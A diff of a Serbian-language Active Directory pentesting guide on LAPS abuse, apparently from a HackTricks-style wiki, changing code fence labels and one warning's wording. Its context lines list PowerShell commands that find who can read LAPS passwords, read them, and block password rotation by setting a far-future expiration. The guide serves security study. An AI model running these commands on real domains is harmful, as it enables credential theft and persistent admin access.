@@ -27,7 +27,7 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 Možete **preuzeti sirovu LAPS politiku** sa `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` i zatim koristiti **`Parse-PolFile`** iz [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketa da konvertujete ovu datoteku u format koji je čitljiv za ljude.
 
 Pored toga, **nativni LAPS PowerShell cmdleti** mogu se koristiti ako su instalirani na mašini kojoj imamo pristup:
-```powershell
+```bash
 Get-Command *AdmPwd*
 
 CommandType     Name                                               Version    Source
@@ -48,7 +48,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
 **PowerView** se takođe može koristiti da se sazna **ko može da pročita lozinku i pročita je**:
-```powershell
+```bash
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 
@@ -60,7 +60,7 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) olakšava enumeraciju LAPS-a sa nekoliko funkcija.\
 Jedna od njih je parsiranje **`ExtendedRights`** za **sve računare sa omogućenim LAPS-om.** Ovo će prikazati **grupe** specifično **delegirane za čitanje LAPS lozinki**, koje su često korisnici u zaštićenim grupama.\
 **Nalog** koji je **pridružio računar** domenu dobija `All Extended Rights` nad tim hostom, a ovo pravo daje **nalogu** mogućnost da **čita lozinke**. Enumeracija može prikazati korisnički nalog koji može čitati LAPS lozinku na hostu. Ovo može pomoći da **ciljamo specifične AD korisnike** koji mogu čitati LAPS lozinke.
-```powershell
+```bash
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
 
@@ -104,7 +104,7 @@ Password: 2Z@Ae)7!{9#Cq
 ### **Datum isteka**
 
 Kada postanete administrator, moguće je **dobiti lozinke** i **sprečiti** mašinu da **ažurira** svoju **lozinku** tako što ćete **postaviti datum isteka u budućnost**.
-```powershell
+```bash
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 
@@ -113,7 +113,7 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 > [!WARNING]
-> Lozinka će se i dalje resetovati ako **admin** koristi **`Reset-AdmPwdPassword`** cmdlet; ili ako je **Ne dozvoliti vreme isteka lozinke duže od onog što zahteva politika** omogućeno u LAPS GPO.
+> Lozinka će se i dalje resetovati ako **admin** koristi **`Reset-AdmPwdPassword`** cmdlet; ili ako je omogućena opcija **Ne dozvoli vreme isteka lozinke duže od onog što zahteva politika** u LAPS GPO.
 
 ### Backdoor
 
